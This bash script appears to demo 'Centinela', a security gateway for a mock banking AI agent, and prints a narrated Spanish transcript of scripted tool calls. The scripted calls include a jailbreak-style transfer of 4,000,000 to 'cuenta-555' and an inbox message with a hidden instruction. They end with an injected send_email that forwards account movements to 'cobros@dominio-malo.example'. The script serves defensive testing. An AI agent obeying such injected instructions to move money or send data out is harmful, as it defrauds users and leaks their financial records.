#!/usr/bin/env bash
# Runs the full Centinela flow through the gateway over a mock profile and
# prints a narrated transcript. Also populates the Salvoconducto UI's live log.
# Self-contained: no WhatsApp credentials needed (step-ups show as blocked here;
# with credentials they go to your phone and bypass attempts alert you).
set -euo pipefail

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
cd "$ROOT"
cargo build -q -p houston-centinela-mcp
BIN="$ROOT/target/debug/houston-centinela-mcp"
LOG="$ROOT/engine/houston-centinela-mcp/ui/decisions.jsonl"
: > "$LOG"

frame() { printf '{"jsonrpc":"2.0","id":%s,"method":"tools/call","params":{"name":"%s","arguments":%s}}\n' "$1" "$2" "$3"; }

# One session so taint persists from read_inbox into the later send. The
# step-up (allowlisted send) runs BEFORE read_inbox so it is not yet tainted.
{
  frame 1 check_balance '{}'
  frame 2 list_transactions '{}'
  frame 3 send_email '{"to":"notificaciones@api.santoria.app","subject":"resumen","body":"tu resumen del dia"}'
  frame 4 transfer_money '{"to":"cuenta-555","amount":4000000}'
  frame 5 read_inbox '{}'
  frame 6 send_email '{"to":"cobros@dominio-malo.example","subject":"movimientos","body":"reenvio"}'
} | CENTINELA_LOG="$LOG" "$BIN" 2>/dev/null | python3 -c '
import sys, json
labels = {
  1: "Consulta tu SALDO  (lectura permitida)",
  2: "Lista tus MOVIMIENTOS  (lectura permitida)",
  3: "Quiere ENVIAR una notificacion interna  (accion con salida)",
  4: "Bajo presion, intenta MOVER $4.000.000 a la cuenta 555  (jailbreak)",
  5: "Lee tu BANDEJA  (trae un correo con instruccion oculta)",
  6: "Intenta REENVIAR tus movimientos al dominio malicioso  (inyeccion)",
}
for line in sys.stdin:
    line = line.strip()
    if not line: continue
    msg = json.loads(line)
    rid = msg.get("id")
    res = msg.get("result", {})
    text = res.get("content", [{}])[0].get("text", "")
    if "CONFIRMACION" in text:
        mark = "PIDE TU OK POR WHATSAPP"
    elif res.get("isError"):
        mark = "BLOQUEADO"
    else:
        mark = "OK"
    print(f"\n[{rid}] {labels.get(rid, rid)}")
    print(f"    -> {mark}")
    for ln in text.split("\n"):
        print(f"       {ln}")
'
echo ""
echo "==> Log poblado en la Salvoconducto UI:  http://localhost:8848"
